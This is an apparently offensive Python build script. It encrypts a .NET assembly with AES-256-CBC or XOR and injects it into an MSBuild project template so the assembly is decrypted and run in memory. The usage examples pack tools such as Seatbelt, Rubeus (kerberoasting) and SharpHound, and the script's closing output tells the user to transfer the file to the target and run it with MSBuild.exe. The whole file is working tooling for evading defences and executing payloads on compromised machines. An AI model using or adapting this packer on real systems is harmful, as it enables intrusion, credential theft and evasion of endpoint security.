#!/usr/bin/env python3
"""
build_msbuild.py -- Encrypts a .NET assembly and injects into msbuild_payload.csproj

Usage:
  python build_msbuild.py <assembly_path> [options] [-- <assembly_args>...]

  Everything after -- is passed as arguments to the loaded assembly's Main().

Examples:
  python build_msbuild.py Seatbelt.exe -- -group=all
  python build_msbuild.py Seatbelt.exe -e xor -- -group=all
  python build_msbuild.py Rubeus.exe -e aes -- kerberoast
  python build_msbuild.py SharpHound.exe -o ready.csproj -- -c All
  python build_msbuild.py Seatbelt.exe --key <64-hex> --iv <32-hex>
"""

import argparse
import base64
import os
import sys


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
    except ImportError:
        print("[-] AES encryption requires the 'cryptography' package.", file=sys.stderr)
        print("    Install with: pip install cryptography", file=sys.stderr)
        print("    Or use -e xor for XOR encryption (no dependencies).", file=sys.stderr)
        sys.exit(1)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def patch_template_for_xor(template: str) -> str:
    """Replace AES decrypt with XOR decrypt in the template for XOR mode."""

    aes_method = (
        "    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)\n"
        "    {\n"
        "        using (RijndaelManaged aes = new RijndaelManaged())\n"
        "        {\n"
        "            aes.Key = key;\n"
        "            aes.IV = iv;\n"
        "            aes.Mode = CipherMode.CBC;\n"
        "            aes.Padding = PaddingMode.PKCS7;\n"
        "            ICryptoTransform decryptor = aes.CreateDecryptor();\n"
        "            return decryptor.TransformFinalBlock(data, 0, data.Length);\n"
        "        }\n"
        "    }"
    )

    xor_method = (
        "    static byte[] XorDecrypt(byte[] data, byte[] key)\n"
        "    {\n"
        "        byte[] result = new byte[data.Length];\n"
        "        for (int i = 0; i < data.Length; i++)\n"
        "            result[i] = (byte)(data[i] ^ key[i % key.Length]);\n"
        "        return result;\n"
        "    }"
    )

    template = template.replace(aes_method, xor_method)

    # Remove IV field
    template = template.replace(
        '    static string IV_B64 = "YOURIVHERE";\n', ""
    )

    # Remove IV decode and cleanup in Execute()
    template = template.replace(
        "            byte[] iv = Convert.FromBase64String(IV_B64);\n", ""
    )
    template = template.replace(
        "            byte[] clearAssembly = AesDecrypt(encrypted, key, iv);",
        "            byte[] clearAssembly = XorDecrypt(encrypted, key);",
    )
    template = template.replace(
        "            Array.Clear(iv, 0, iv.Length);\n", ""
    )

    # Remove crypto using/namespace (not needed for XOR)
    template = template.replace("using System.Security.Cryptography;\n", "")
    template = template.replace(
        "      <Using Namespace=\"System.Security.Cryptography\" />\n", ""
    )

    return template


def main():
    argv = sys.argv[1:]
    assembly_args = []
    if "--" in argv:
        split_idx = argv.index("--")
        assembly_args = argv[split_idx + 1:]
        argv = argv[:split_idx]

    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into msbuild_payload.csproj"
    )
    parser.add_argument("assembly", help="Path to .NET assembly to encrypt")
    parser.add_argument(
        "-e", "--encryption", choices=["aes", "xor"], default="aes",
        help="Encryption method: aes (AES-256-CBC, default) or xor"
    )
    parser.add_argument(
        "--key", help="Encryption key as hex (32 bytes for AES, any length for XOR)"
    )
    parser.add_argument(
        "--iv", help="AES IV as hex (16 bytes / 32 hex chars, ignored with -e xor)"
    )
    parser.add_argument("-o", "--output", help="Output file (default: msbuild_ready.csproj)")
    parser.add_argument("--template", help="Template csproj (default: msbuild_payload.csproj)")
    args = parser.parse_args(argv)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "msbuild_payload.csproj")
    output_path = args.output or os.path.join(script_dir, "msbuild_ready.csproj")

    if not os.path.exists(args.assembly):
        print(f"[-] Assembly not found: {args.assembly}", file=sys.stderr)
        sys.exit(1)

    if not os.path.exists(template_path):
        print(f"[-] Template not found: {template_path}", file=sys.stderr)
        sys.exit(1)

    with open(args.assembly, "rb") as f:
        assembly_bytes = f.read()
    print(f"[*] Assembly: {args.assembly} ({len(assembly_bytes)} bytes)", file=sys.stderr)

    with open(template_path, "r") as f:
        template = f.read()

    if args.encryption == "xor":
        if args.key:
            key = bytes.fromhex(args.key)
        else:
            key = os.urandom(16)

        print(f"[*] Mode: XOR", file=sys.stderr)
        print(f"[*] XOR key: {key.hex()}", file=sys.stderr)

        encrypted = xor_encrypt(assembly_bytes, key)
        template = patch_template_for_xor(template)

        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')

    else:
        # AES-256-CBC (default)
        if args.key:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                print(
                    f"[-] AES-256 key must be 32 bytes (64 hex chars), got {len(key)}",
                    file=sys.stderr,
                )
                sys.exit(1)
        else:
            key = os.urandom(32)

        if args.iv:
            iv = bytes.fromhex(args.iv)
            if len(iv) != 16:
                print(
                    f"[-] AES IV must be 16 bytes (32 hex chars), got {len(iv)}",
                    file=sys.stderr,
                )
                sys.exit(1)
        else:
            iv = os.urandom(16)

        print(f"[*] Mode: AES-256-CBC", file=sys.stderr)
        print(f"[*] AES key: {key.hex()}", file=sys.stderr)
        print(f"[*] AES IV:  {iv.hex()}", file=sys.stderr)

        encrypted = aes_encrypt(assembly_bytes, key, iv)

        encrypted_b64 = base64.b64encode(encrypted).decode("ascii")
        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")

        template = template.replace('"YOURPAYLOADHERE"', f'"{encrypted_b64}"')
        template = template.replace('"YOURKEYHERE"', f'"{key_b64}"')
        template = template.replace('"YOURIVHERE"', f'"{iv_b64}"')

    print(f"[*] Encrypted payload: {len(encrypted_b64)} chars base64", file=sys.stderr)

    # Replace args placeholder
    if assembly_args:
        args_lines = []
        for arg in assembly_args:
            escaped = arg.replace("\\", "\\\\").replace('"', '\\"')
            args_lines.append(f'        "{escaped}",')
        args_str = "\n".join(args_lines)
        template = template.replace("        // YOURARGS", args_str)

    # Write as pure ASCII
    template = template.encode("ascii", errors="ignore").decode("ascii")
    with open(output_path, "w", encoding="ascii") as f:
        f.write(template)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] Written: {output_path} ({size_kb:.0f} KB)", file=sys.stderr)
    print(f"[*] Transfer to target and run:", file=sys.stderr)
    print(
        f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"
        f" {os.path.basename(output_path)}",
        file=sys.stderr,
    )


if __name__ == "__main__":
    main()
